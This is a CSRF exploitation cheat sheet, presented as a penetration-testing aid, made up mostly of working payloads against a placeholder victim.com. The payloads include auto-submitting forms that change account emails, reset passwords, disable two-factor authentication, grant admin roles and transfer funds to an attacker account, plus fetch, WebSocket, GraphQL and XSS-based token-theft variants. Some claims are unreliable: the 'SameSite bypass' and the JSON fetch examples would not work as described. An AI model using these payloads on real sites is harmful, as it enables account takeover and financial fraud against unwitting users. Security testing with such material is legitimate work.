# **Cross-Site Request Forgery (CSRF) Payload Cheat Sheet**

CSRF exploits force authenticated users to execute unintended actions on a web application. Below are various CSRF payloads for testing and exploitation.

---

## **1. Basic CSRF Payloads**

### **HTML Form-Based CSRF**
```html
<form action="https://victim.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### **GET Request CSRF (via `<img>` Tag)**
```html
<img src="https://victim.com/delete-account?id=1" width="0" height="0">
```

---

## **2. Advanced CSRF Techniques**

### **JSON CSRF (Using Fetch API)**
```html
<script>
  fetch('https://victim.com/api/update-profile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ is_admin: true })
  });
</script>
```

### **CSRF with Auto-Submitting Form (No User Interaction)**
```html
<body onload="document.forms[0].submit()">
  <form action="https://victim.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="account" value="ATTACKER_ACCOUNT">
  </form>
</body>
```

---

## **3. Bypassing CSRF Protections**

### **Bypassing CSRF Tokens (If Token is Predictable)**
```html
<form action="https://victim.com/reset-password" method="POST">
  <input type="hidden" name="csrf_token" value="1234567890">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

### **Stealing CSRF Tokens via XSS + CSRF**
```html
<script>
  fetch('https://victim.com/sensitive-action')
    .then(res => res.text())
    .then(html => {
      const token = html.match(/csrf_token="([^"]+)"/)[1];
      fetch('https://victim.com/change-email', {
        method: 'POST',
        body: `email=attacker@evil.com&csrf_token=${token}`
      });
    });
</script>
```

---

## **4. CSRF in REST APIs (JSON POST)**
### **Exploiting `application/json` Endpoints**
```html
<script>
  fetch('https://victim.com/api/update-role', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ role: 'admin' })
  });
</script>
```

### **Bypassing `SameSite` Cookie Restrictions**
```html
<form action="https://victim.com/logout" method="POST">
  <input type="hidden" name="confirm" value="1">
</form>
<script>
  setTimeout(() => document.forms[0].submit(), 2000);
</script>
```

---

## **5. CSRF via Malicious File Uploads**
### **PDF with Auto-Submitting Form**
```html
<iframe src="data:application/pdf;base64,JVBERi0xLjMK...<PDF_CONTENT>..."></iframe>
<!-- PDF contains an auto-submitting form -->
```

---

## **6. CSRF in GraphQL APIs**
### **Exploiting GraphQL Mutations**
```html
<script>
  fetch('https://victim.com/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: 'mutation { changePassword(newPassword: "hacked123") }'
    })
  });
</script>
```

---

## **7. Blind CSRF (No Response Needed)**
### **Exploiting Actions Without Feedback**
```html
<form action="https://victim.com/disable-2fa" method="POST">
  <input type="hidden" name="confirm" value="1">
</form>
<script>document.forms[0].submit();</script>
```

---

## **8. CSRF in WebSockets**
### **Triggering Actions via WebSocket**
```html
<script>
  const ws = new WebSocket('wss://victim.com/api');
  ws.onopen = () => ws.send(JSON.stringify({ action: 'delete_account' }));
</script>
```

---

## **9. CSRF via Flash (Old-School)**
### **Using Flash + `URLRequest`**
```actionscript
import flash.net.URLRequest;
var req = new URLRequest("https://victim.com/logout");
req.method = "POST";
flash.net.sendToURL(req);
```

---

## **10. Real-World Exploit Examples**
### **Changing Email via CSRF**
```html
<form action="https://victim.com/settings/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### **Bank Transfer CSRF**
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
</form>
<script>document.forms[0].submit();</script>
```

---

## **Testing Methodology**
1. **Identify State-Changing Actions** (POST/GET endpoints).
2. **Check for CSRF Tokens** (and predictability).
3. **Test with Auto-Submitting Forms**.
4. **Verify if `SameSite` Cookies Mitigate Risk**.
5. **Check for CORS Misconfigurations**.

---

## **Mitigation**
- **Use CSRF Tokens** (synchronizer token pattern).
- **Implement `SameSite` Cookies** (`Strict` or `Lax`).
- **Require Re-Authentication for Sensitive Actions**.
- **Check `Origin`/`Referer` Headers**.

---

### **⚠️ Legal & Ethical Considerations**
- **Only test on authorized systems**.
- **CSRF can lead to account takeover, financial fraud**.
- **Disclose responsibly** if found in production.

---

This cheat sheet covers various CSRF exploitation techniques for penetration testing and bug bounty hunting. Use responsibly! 🚀